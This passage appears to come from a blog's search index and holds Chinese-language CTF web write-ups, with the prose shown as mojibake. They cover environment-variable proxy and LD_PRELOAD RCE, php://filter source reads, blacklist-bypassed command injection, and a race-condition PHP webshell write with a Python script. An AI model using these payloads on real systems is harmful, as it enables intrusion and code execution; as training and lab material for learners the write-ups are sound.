","uri":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/"},{"categories":["CTF"],"content":"[WEB] justcurl from flask import render_template, request, Flask import os app = Flask(__name__) def check(s): if 'LD' in s or 'BASH' in s or 'ENV' in s or 'PS' in s: return False return True @ app.route('/') @ app.route('/index') def index(): try: choose = request.args.get('choose') except: choose = \"\" try: key = request.args.get('key') except: key = \"\" try: value = request.args.get('value').upper() except: value = \"\" if value: if check(value): os.environ[key] = value if choose == \"o\": cmd = \"curl http://127.0.0.1:5000/result -o options.txt\" elif choose == \"K\": cmd = \"curl http://127.0.0.1:5000/result -K options.txt\" else: cmd = \"curl http://127.0.0.1:5000/result\" try: res = os.popen(cmd).read() return \"your cmd is : \" + cmd + \" \\n and your result id :\" + res except: return \"error\" @ app.route('/result') def logout(): code = \"no result\" return render_template(\"index.html\",code=code) if __name__ == \"__main__\": app.run(host='0.0.0.0', port=5000) å…³æ³¨ os.environ[key] = value å‘ç°å¯ä»¥æ§åˆ¶ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥åˆ©ç”¨çš„å¤§æ¦‚æœ‰ LD_PRELOAD ALL_PROXY HTTP_PROXY LD_PRELOAD æ˜¯å¸¸è§çš„ disabled_function ç»•è¿‡æ–¹å¼ï¼Œè€Œè®¾ç½® PROXY å¯ä»¥è®©æœåŠ¡å™¨å°†è¯·æ±‚å‘é€åˆ°æˆ‘ä»¬è‡ªå·±çš„ VPS æœåŠ¡å™¨éœ€è¦æ”¶åˆ°è¯·æ±‚ä¹‹åè¿”å› curl é…ç½®æ–‡ä»¶ï¼Œæ¯”èµ›çš„æ—¶å€™æ²¡çœ‹ æ–‡æ¡£ ä¸ä¼šå†™ğŸ˜­ url = \"https://curl.se/docs/\" # --- Example file --- # this is a comment url = \"example.com\" output = \"curlhere.html\" user-agent = \"superagent/1.0\" # and fetch another URL too url = \"example.com/docs/manpage.html\" -O referer = \"http://nowhereatall.example.com/\" # --- End of example file --- ç„¶åè¿™é‡Œæ˜¯ Hurrisonâ€™s Blog çš„ wp å’Œä¾‹å­ èƒ½å¤Ÿå¯¹ curl é…ç½®æ–‡ä»¶å¯æ§ä¹‹åï¼Œæˆ‘ä»¬åªéœ€è¦åˆ©ç”¨ LD_PRELOAD ç¯å¢ƒå˜é‡æ¼æ´å°±å¯è¾¾æˆ rce ã€‚ ?key=http_proxy\u0026value=http://\u003cip\u003e:80\u0026choose=K ?key=LD_PRELOAD\u0026value=./LIB.SO ?key=CMD\u0026value=ls%20/ è‡ªå·±æ­ç¯å¢ƒå¤ç°çš„æ—¶å€™ä¼šæŠ¥é”™ ERROR: ld.so: object LD_PRELOAD cannot be preloaded: ignored ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰æ‰¾åˆ°æ–‡ä»¶çš„åŸå› ï¼Œå°è¯•å†™ç»å¯¹è·¯å¾„ ","date":"2022-11-06","objectID":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/:2:0","tags":["CTF","WEB","Writeup"],"title":"å››å·çœç½‘å®‰æŠ€èƒ½å¤§èµ›2022-å¤ç°å­¦ä¹ ","uri":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/"},{"categories":["CTF"],"content":"[WEB] simplephp çœ‹èµ·æ¥åƒ sql æ³¨å…¥ï¼Œfuzz ä¹‹åæ„Ÿè§‰ç¦ç”¨æœ‰äº›å¤šï¼Œç­‰ wp äº† ","date":"2022-11-06","objectID":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/:3:0","tags":["CTF","WEB","Writeup"],"title":"å››å·çœç½‘å®‰æŠ€èƒ½å¤§èµ›2022-å¤ç°å­¦ä¹ ","uri":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/"},{"categories":["CTF"],"content":"æ‘˜è¦ï¼šå¤šæ¥ç‚¹æ–°ç”Ÿå¤§è·Œæ–¯å“ˆæ–¯å“ˆğŸ¤¤","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/","tags":["CTF","WEB","Writeup"],"title":"CNSS2022å¤ä»¤è¥_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"\ræœ¬ç¯‡ Writeup ä¸»è¦æ˜¯ç”¨äºå†™ç»™æ–°ç”Ÿå¤ç°å­¦ä¹ çš„ï¼Œé¶æœºä¼šå¼€æ”¾åˆ°ä¸­ç§‹åº”è¯¥ æ½œåŠ›æ–°ç”Ÿå¤šæ¥ç‚¹å“©ï¼Œæ–¯å“ˆæ–¯å“ˆğŸ¤¤ ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:0:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022å¤ä»¤è¥_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"ğŸ”¢ æ›´ç®€å•çš„è®¡ç®—é¢˜ æ‰“å¼€ç½‘ç«™å‘ç°åšäº†å‰ç«¯é™åˆ¶ï¼Œé™åˆ¶äº†é•¿åº¦ä¸º 5ï¼ŒåŒæ—¶ç¦ç”¨äº†æäº¤æŒ‰é’® \u003cform method=\"post\"\u003e \u003cinput type=\"text\" name=\"re\" maxlength=\"5\"\u003e \u003cinput type=\"submit\" value=\"æäº¤\" disabled=\"\"\u003e \u003c/form\u003e ä¿®æ”¹åæäº¤å³å¯ \u003cform method=\"post\"\u003e \u003cinput type=\"text\" name=\"re\"\u003e \u003cinput type=\"submit\" value=\"æäº¤\"\u003e \u003c/form\u003e ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:1:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022å¤ä»¤è¥_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"âš™ï¸ D3buger ä¸€ä¸ªä¿„ç½—æ–¯æ–¹å—çš„å°æ¸¸æˆï¼Œç”¨ js è„šæœ¬ç¦ç”¨äº† F12ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å…ˆæ‰“å¼€ F12ï¼Œå†è¿›å…¥é¡µé¢ï¼Œæˆ–è€…ç›´æ¥ Ctrl+S å°±å¯å¾—åˆ°ä»¥ä¸‹æºç  //å±è”½å³é”®èœå• document.oncontextmenu = function(event) { if (window.event) { event = window.event; } try { var the = event.srcElement; if (!((the.tagName == \"INPUT\" \u0026\u0026 the.type.toLowerCase() == \"text\") || the.tagName == \"TEXTAREA\")) { return false; } return true; } catch (e) { return false; } } //å±è”½ç²˜è´´ document.onpaste = function(event) { if (window.event) { event = window.event; } try { var the = event.srcElement; if (!((the.tagName == \"INPUT\" \u0026\u0026 the.type.toLowerCase() == \"text\") || the.tagName == \"TEXTAREA\")) { return false; } return true; } catch (e) { return false; } } //å±è”½å¤åˆ¶ //å±è”½å‰ªåˆ‡ document.oncut = function(event) { if (window.event) { event = window.event; } try { var the = event.srcElement; if (!((the.tagName == \"INPUT\" \u0026\u0026 the.type.toLowerCase() == \"text\") || the.tagName == \"TEXTAREA\")) { return false; } return true; } catch (e) { return false; } } //ç¦æ­¢f12 function fuckyou() { window.opener=null; window.open('','_self'); window.close(); //å…³é—­å½“å‰çª—å£(é˜²æŠ½) window.location = \"about:blank\"; //å°†å½“å‰çª—å£è·³è½¬ç½®ç©ºç™½é¡µ } function ck() { console.profile(); console.profileEnd(); //æˆ‘ä»¬åˆ¤æ–­ä¸€ä¸‹profilesé‡Œé¢æœ‰æ²¡æœ‰ä¸œè¥¿ï¼Œå¦‚æœæœ‰ï¼Œè‚¯å®šæœ‰äººæŒ‰F12äº†ï¼Œæ²¡é”™ï¼ï¼ if (console.clear) { console.clear() }; if (typeof console.profiles == \"object\") { return console.profiles.length \u003e 0; } } function hehe() { if ((window.console \u0026\u0026 (console.firebug || console.table \u0026\u0026 /firebug/i.test(console.table()))) || (typeof opera == 'object' \u0026\u0026 typeof opera.postError == 'function' \u0026\u0026 console.profile.length \u003e 0)) { fuckyou(); } if (typeof console.profiles == \"object\" \u0026\u0026 console.profiles.length \u003e 0) { fuckyou(); } } hehe(); window.onresize = function() { if (window.outerWidth - window.innerWidth \u003e 20 || window.outerHeight - window.innerHeight \u003e 100) //åˆ¤æ–­å½“å‰çª—å£å†…é¡µé«˜åº¦å’Œçª—å£é«˜åº¦ï¼Œå˜¿å˜¿ fuckyou(); } document.onkeydown = function(event) { if ((event.keyCode == 112) || //å±è”½ F1 (event.keyCode == 113) || //å±è”½ F2 (event.keyCode == 114) || //å±è”½ F3 (event.keyCode == 115) || //å±è”½ F4 // (event.keyCode == 116) || //å±è”½ F5 (event.keyCode == 117) || //å±è”½ F6 (event.keyCode == 118) || //å±è”½ F7 (event.keyCode == 119) || //å±è”½ F8 (event.keyCode == 120) || //å±è”½ F9 (event.keyCode == 121) || //å±è”½ F10 (event.keyCode == 122) || //å±è”½ F11 (event.keyCode == 123) || //å±è”½ F12 ((event.ctrlKey)\u0026\u0026(event.keyCode==85))) //Ctrl + U //å…¶å®è¿˜æœ‰ Ctrl + Shift + I å’Œ Ctrl +Shift + C { return false; } } window.onhelp = function() { return false; } // å¦‚ä½ æ‰€è§çš„ï¼Œ // èœç‹— xlykle æ˜¯æ ¹æœ¬ä¸ä¼šå†™ç½‘é¡µçš„ï¼Œ // ä¿„ç½—æ–¯æ–¹å—æ˜¯ zhihu æŠ„çš„ï¼Œ // js ä»£ç æ˜¯é€›åšå®¢æ—¶å·çš„ï¼Œ // åªå‰© [æ•¢ æ€ æˆ‘ çš„ é©¬] æ˜¯æˆ‘è‡ªå·±æ‰¾çš„äº†ã€‚ // å¥—ä¸ªå¨ƒåº”è¯¥æ˜¯éš¾ä¸ä½ä½ çš„...... // ç®—äº†è¿˜æ˜¯ç›´æ¥ç»™å§ï¼ˆè®°å¾—å–ä¸€ä¸‹æœ¬é¢˜å½©è›‹ğŸ˜˜ // CNSS{Wh@t_A_Sham3le55_thI3f} ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:2:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022å¤ä»¤è¥_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"ğŸš© Signin æ‰“å¼€ç½‘ç«™åå‘ç°æç¤º Please Change Your Method! é‚£ä¹ˆæˆ‘ä»¬æŠ“åŒ…ï¼ˆè¿˜ä¸ä¼šçš„æ–°ç”Ÿå»ºè®®ä¸‹ä¸€ä¸ª Burp Suiteï¼‰åä¿®æ”¹è¯·æ±‚æ–¹å¼ä¸º POSTï¼Œå¯ä»¥å¾—åˆ°æºç  \u003c?php error_reporting(0); require_once(\"flag.php\"); if($_SERVER['REQUEST_METHOD'] !=='POST'){ die(\"Please Change Your Method!\"); exit(); }else{ if(!isset($_POST[\"CNSS\"])){ show_source(__FILE__); } else if($_POST[\"CNSS\"] === \"join\"){ if((isset($_GET[\"web\"])) \u0026\u0026 (($_GET[\"web\"]) === \"like\")){ setcookie(\"flag\",\"0\"); if($_COOKIE['flag'] === '1'){ echo $flag; }else{show_source(__FILE__);} }else{ show_source(__FILE__); } } } é‚£ä¹ˆå¾ˆç®€å•ï¼Œåªéœ€è¦æˆ‘ä»¬æ ¹æ®è¦æ±‚ä¼ å‚æ•°å³å¯ POST /?web=like HTTP/1.1 Host: 8.130.29.197:6001 Content-Length: 9 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://8.130.29.197:6001 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6 Cookie: flag=1 Connection: close CNSS=join ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:3:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022å¤ä»¤è¥_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"ğŸ”¢ æ›´å‘çš„è®¡ç®—é¢˜ éœ€è¦åœ¨1så†…è®¡ç®—å‡ºæ­£ç¡®ç­”æ¡ˆå¹¶æäº¤ï¼Œé€šè¿‡æºç ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°+1sçš„æŒ‰é’®æ˜¯å®‰æ…°å‰‚ï¼Œ \u003cscript\u003e var fool = document.getElementById(\"fool\"); var eggs = document.getElementById(\"eggs\"); fool.count = 0; fool.onclick = function() { eggs.innerHTML = ++ this.count; } // ä¸Šå¸å¯¹æ¯ä¸ªäººéƒ½æ˜¯å…¬å¹³çš„ï¼Œä½ ä»¬åªæœ‰ 1s çš„æ—¶é—´ \u003c/script\u003e é¢„æœŸè§£æ˜¯ä½¿ç”¨è„šæœ¬æäº¤ï¼ˆè„šæœ¬ä»€ä¹ˆçš„å½“ç„¶æ˜¯pyæœ€æ–¹ä¾¿äº† import requests import re url = 'http://8.130.29.197:6003/' session = requests.session() response = session.get(url) getEquation = re.findall(r'\u003cp\u003e(.*?)=\u003c/p\u003e', response.text)[0] formData = {\"res\": eval(getEquation)} re2 = session.post(url, data=formData) print(re2.text) è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæäº¤æ—¶éœ€è¦ä½¿ç”¨åŒä¸€ä¸ª Sessionï¼Œä¸ç„¶ç®—å¼æ˜¯ä¼šåˆ·æ–°çš„ ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:4:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022å¤ä»¤è¥_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"ğŸ‡¨ğŸ‡³ China Flag è¿™é¢˜æœ‰ç‚¹åè„‘æ´é¢˜ï¼Œæ‰“å¼€é“¾æ¥åæœ‰ä¸€å¼ å¯ä»¥ç‚¹å‡»çš„å›¾ç‰‡ï¼Œç‚¹å‡»è·³è½¬åˆ° ./china.phpã€‚ å›æ˜¾ æˆ‘çš„æœ‹å‹ï¼Œä½ ä»å“ªå„¿æ‰¾æ¥çš„ï¼Œè”æƒ³åˆ° HTTP æŠ¥å¤´ä¸­çš„ Refererï¼Œä¿®æ”¹Referer=http://8.130.29.197:6004/index.php å›æ˜¾ ä½ çœŸçš„æ˜¯åœŸç”ŸåœŸé•¿çš„æ‹†å°¼æ–¯ğŸ´ï¼ŒæŒ‡çš„æ˜¯ä»£ç†éœ€è¦ä¸ºæœ¬åœ°ï¼Œä¿®æ”¹X-Forwarded-For: 127.0.0.1 å›æ˜¾ æˆ‘ä»¬ä¸­å›½äººä¸åƒğŸå¤§äººé‚£å¥—ï¼Œè€ƒè™‘æŠ¥å¤´ä¸­ä¸­å›½äººå’ŒğŸå¤§äººçš„åŒºåˆ«å¯èƒ½æŒ‡çš„æ˜¯è¯­è¨€ï¼Œä¿®æ”¹Accept-Language: zh-CN,zh;q=0.9å¾—åˆ°flag æœ€ç»ˆpayloadï¼š GET /china.php HTTP/1.1 Host: 8.130.29.197:6004 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Content-Length: 0 X-Forwarded-For: 127.0.0.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://8.130.29.197:6004/index.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:5:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022å¤ä»¤è¥_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"ğŸ¤¥ Trick è®¿é—®é¡µé¢ç›´æ¥å¾—åˆ°æºç  \u003c?php error_reporting(0); require_once(\"flag.php\"); show_source(__FILE__); $pass = '0e0'; $md55 = $_COOKIE['token']; $md55 = md5($md55); if(md5($md55) == $pass){ if(isset($_GET['query'])){ $before = $_GET['query']; $med = 'filter'; $after = preg_replace( \"/$med/\", '', $before ); if($after === $med){ echo $flag1; } } $verify = $_GET['verify']; } extract($_POST); if(md5($verify) === $pass){ echo $$verify; } ?\u003e é€è¡Œå®¡è®¡ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦å°†ä¼ å…¥çš„ token è¿›è¡Œä¸¤æ¬¡ md5 åŠ å¯†å == 0e0ï¼Œè¿™é‡Œå‘ç°æ˜¯å¼±æ¯”è¾ƒ å¼±æ¯”è¾ƒæ—¶ï¼Œå˜é‡ç±»å‹ä¼šå¼ºåˆ¶è½¬åŒ–ï¼Œ0eå¼€å¤´çš„çº¯æ•°å­—å­—ç¬¦ä¸²ä¼šè¢«è½¬åŒ–ä¸ºç§‘å­¦è®¡æ•°æ³•æ•°å­— é‚£ä¹ˆå°±æœ‰ â€˜0e1145141919810â€™ == 0e0 è´´ä¸€ä¸‹çˆ†ç ´è„šæœ¬ï¼ˆå»ºè®®è‡ªå·±è·‘ä¸€éå—· import string import hashlib payload = string.ascii_letters + string.digits def calc_md5(s): md5 = hashlib.md5(s.encode(\"utf-8\")).hexdigest() md5_double = hashlib.md5(md5.encode(\"utf-8\")).hexdigest() if (md5_double[0:2] == \"0e\" and md5_double[2:].isdigit()): print(s) def getstr(payload, s, slen): if (len(s) == slen): calc_md5(s) return s for i in payload: sl = s + i getstr(payload, sl, slen) # å­—ç¬¦ä¸²é•¿åº¦ä»0åˆ°30ï¼Œè‚¯å®šæ‰¾å¾—åˆ° for i in range(3, 30): getstr(payload, '', i) è¿™æ ·æˆ‘ä»¬å°±ç»•è¿‡äº†ç¬¬ä¸€ä¸ª ifï¼Œæ¥ä¸‹æ¥éœ€è¦æˆ‘ä»¬ GET ä¸€ä¸ª query ä½¿å¾—ç»è¿‡ preg_replace å•æ¬¡è¿‡æ»¤åä¸º filterã€‚ è€ƒè™‘åŒå†™ç»•è¿‡ï¼Œå³?query=ffilterilterï¼Œè¿™æ ·å°±å¾—åˆ°äº† $flag1 ç„¶åéœ€è¦å† GET ä¸€ä¸ª verifyï¼Œè¿™é‡Œå‘ç°æœ‰ä¸€è¡Œå¯ç–‘ä»£ç extract($_POST);ï¼Œç›´æ¥ Google extract ä¼šå¯¼è‡´å˜é‡è¢«è¦†ç›–ï¼ŒPOST åˆ™ä½¿å¾—å˜é‡å¯æ§ é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦ POST ä½¿pass=md5(verify)å³å¯ç»•è¿‡ å†è§‚å¯Ÿæœ€åä¸€è¡Œ echo $$verify;ï¼Œå‘ç°æœ‰ä¸¤ä¸ª $$ï¼Œè¿™å°±å…è®¸æˆ‘ä»¬è®¾ç½® verify ä¸ºæŸä¸€ä¸ªå˜é‡ï¼Œå†è·å¾—è¿™ä¸€ä¸ªå˜é‡çš„å€¼ã€‚è€ƒè™‘å‰åŠä¸ª flag ä¸º $flag1ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥çŒœæµ‹ååŠéƒ¨åˆ† flag ä¸º $flag2 é‚£ä¹ˆååŠéƒ¨åˆ†çš„ payload ä¸º GET verify=flag2ï¼ŒPOST pass=9a48ddad2656385fce58af47a0ef56cf ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:6:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022å¤ä»¤è¥_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"â¬› Black Page F12 å‘ç°æç¤º \u003c?phps $file = $_GET[\"file\"]; $blacklist = \"(**blacklist**)\"; if (preg_match(\"/\".$blacklist.\"/is\",$file) == 1){ exit(\"Nooo,You can't read it.\"); }else{ include $file; } //ä½ èƒ½è¯»åˆ° mybackdoor.php å—ï¼Ÿ å°è¯• ?file=mybackdoor.phpï¼Œä½†æ˜¯æ²¡æœ‰å‘ç°å›æ˜¾ã€‚ å› ä¸ºæ­£å¸¸è¯»å–æ—¶æ˜¯æ— æ³•è¯»å–å®ƒçš„æºç çš„ï¼Œå®ƒä¼šè¢«å½“åš php æ–‡ä»¶æ‰§è¡Œ php://filter æ˜¯ php ä¸­ç‹¬æœ‰çš„ä¸€ä¸ªåè®®ï¼Œå¯ä»¥ä½œä¸ºä¸€ä¸ªä¸­é—´æµæ¥å¤„ç†å…¶ä»–æµï¼Œå¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶çš„è¯»å– åç§° æè¿° å¤‡æ³¨ resource=\u003cè¦è¿‡æ»¤çš„æ•°æ®æµ\u003e æŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚ å¿…é€‰ read=\u003cè¯»é“¾çš„ç­›é€‰åˆ—è¡¨\u003e å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚ å¯é€‰ write=\u003cå†™é“¾çš„ç­›é€‰åˆ—è¡¨\u003e å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚ å¯é€‰ \u003cï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨\u003e ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚ å¯é€‰ æ‰€ä»¥å¯ä»¥ä½¿ç”¨ ?file=php://filter/convert.base64-encode/resource=mybackdoor.phpå¾—åˆ° base64 åŠ å¯†çš„æºç  PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwpmdW5jdGlvbiBibGFja2xpc3QoJGNtZCl7CiAgJGZpbHRlciA9ICIoXFw8fFxcPnxGbDRnfHBocHxjdXJsfCB8MHh8XFxcXHxweXRob258Z2NjfGxlc3N8cm9vdHxldGN8cGFzc3xodHRwfGZ0cHxjZHx0Y3B8dWRwfGNhdHzDl3xmbGFnfHBofGhwfHdnZXR8dHlwZXx0eXxcXCRcXHtJRlNcXH18aW5kZXh8XFwqKSI7CiAgaWYgKHByZWdfbWF0Y2goIi8iLiRmaWx0ZXIuIi9pcyIsJGNtZCk9PTEpeyAgCiAgICAgIGV4aXQoJ0dvIG91dCEgVGhpcyBibGFjayBwYWdlIGRvZXMgbm90IGJlbG9uZyB0byB5b3UhJyk7CiAgfQogIGVsc2V7CiAgICBzeXN0ZW0oJGNtZCk7CiAgfQp9CmJsYWNrbGlzdCgkX0dFVFsnY21kJ10pOwo/Pg== è§£å¯†åå¾—åˆ°æºç ï¼š \u003c?php error_reporting(0); function blacklist($cmd){ $filter = \"(\\\\\u003c|\\\\\u003e|Fl4g|php|curl| |0x|\\\\\\\\|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|Ã—|flag|ph|hp|wget|type|ty|\\\\$\\\\{IFS\\\\}|index|\\\\*)\"; if (preg_match(\"/\".$filter.\"/is\",$cmd)==1){ exit('Go out! This black page does not belong to you!'); } else{ system($cmd); } } blacklist($_GET['cmd']); ?\u003e æ˜¯é»‘åå•è¿‡æ»¤çš„ rceï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦éšä¾¿ç»•å°±è¡Œäº† å…ˆè¯»ç›®å½•ï¼Œå‘ç°ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨ %09 ç»•è¿‡ï¼Œ/mybackdoor.php?cmd=ls%09/ å‘ç°æ ¹ç›®å½•ä¸‹æœ‰æ–‡ä»¶ Fl4g_is_hereï¼Œä½¿ç”¨ tac å’Œ ? å¯ä»¥ç»•è¿‡ï¼Œ/mybackdoor.php?cmd=tac%09/Fl4?_is_here ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:7:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022å¤ä»¤è¥_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"â˜¯ï¸ å¤ªææŒé—¨äºº è®¿é—®å¾—åˆ°æºç ï¼š \u003c?php error_reporting(0); show_source(__FILE__); function deleteDir($path) { if (is_dir($path)) { $dirs = scandir($path); foreach ($dirs as $dir) { if ($dir != '.' \u0026\u0026 $dir != '..') { $sonDir = $path.'/'.$dir; if (is_dir($sonDir)) { deleteDir($sonDir); @rmdir($sonDir); } elseif ($sonDir !== './index.php' \u0026\u0026 $sonDir !== './flag.php') { @unlink($sonDir); } } } @rmdir($path); } } $devil = '\u003c?php exit;?\u003e'; $goods = $_POST['goods']; file_put_contents($_POST['train'], $devil . $goods); sleep(1); deleteDir('.'); ?\u003e å®šä¹‰çš„ä¸€å¤§æ®µå‡½æ•°æ˜¯ç”¨æ¥åˆ é™¤ç½‘ç«™ç›®å½•ä¸‹ä½ æ”¾è¿›å»çš„æ–‡ä»¶çš„ï¼Œè€Œé‡ç‚¹å¯åˆ©ç”¨çš„åœ¨æœ€åé¢å‡ è¡Œ $goods = $_POST['goods']; file_put_contents($_POST['train'], $devil . $goods); sleep(1); deleteDir('.'); å¥½ï¼Œå‘ç°å¯ç–‘ä»£ç file_put_contentsï¼Œå¼€å§‹ Google train ä½œä¸ºå†™å…¥è·¯å¾„ï¼Œ$devil.$goods ä½œä¸ºå†™å…¥å†…å®¹ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ php://filter/write=convert.base64-decode/resource= è¯­å¥å°†å†…å®¹è§£å¯†åå†å†™å…¥æ‰§è¡Œä»£ç ï¼Œè¿™æ ·å°±å¯ä»¥æŠŠå¼€å¤´çš„é€€å‡ºä»£ç è½¬æ¢ä¸ºä¹±ç è¿‡æ»¤æ‰ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œbase64 æ˜¯åˆ†ç»„åŠ å¯†çš„ï¼Œæ‰€ä»¥ä¸ºäº†è§£å¯†æ—¶æ¶ˆé™¤å¼€å¤´çš„ $devil ä¸”ä¸å½±å“åé¢çš„å†™å…¥å†…å®¹ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å¼€å¤´è¡¥ä¸Šä¸€ä½ã€‚ ç„¶åä¾¿å¯ä»¥åœ¨ sleep(1) å†…è®¿é—®ï¼Œæ‰‹é€Ÿå¿«çš„è¯å¯ä»¥ç›´æ¥åˆ‡ï¼Œé¢„æœŸè§£æ˜¯å¤šçº¿ç¨‹çš„è„šæœ¬ï¼š import requests import base64 from threading import Thread from time import sleep url1 = 'http://8.130.29.197:6002/' url2 = 'http://8.130.29.197:6002/a.php' data = { 'goods': b'a'+base64.b64encode(b'\u003c?php system(\"cat flag.php\");?\u003e'), 'train': 'php://filter/write=convert.base64-decode/resource=a.php' } t = Thread(target=requests.post, args=(url1, data)) t.start() sleep(0.1) x = requests.get(url2) print(x.text) ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:8:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022å¤ä»¤è¥_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"ğŸ¥³ To_be_Admin æ‰“å¼€ç½‘å€ï¼Œçœ‹åˆ°ä¸¤ä¸ªæç¤º Go to Your page å’Œ Access /read to read file what you want. ç‚¹å‡»ç¬¬ä¸€ä¸ªæŒ‰é’®è·³è½¬ ./admin å‘ç°æƒé™ä¸å¤Ÿï¼Œé‚£ä¹ˆæœåŠ¡å™¨ç«¯æ˜¯ä¾é ä»€ä¹ˆåˆ¤æ–­æˆ‘ä»¬æ˜¯ä¸æ˜¯ admin 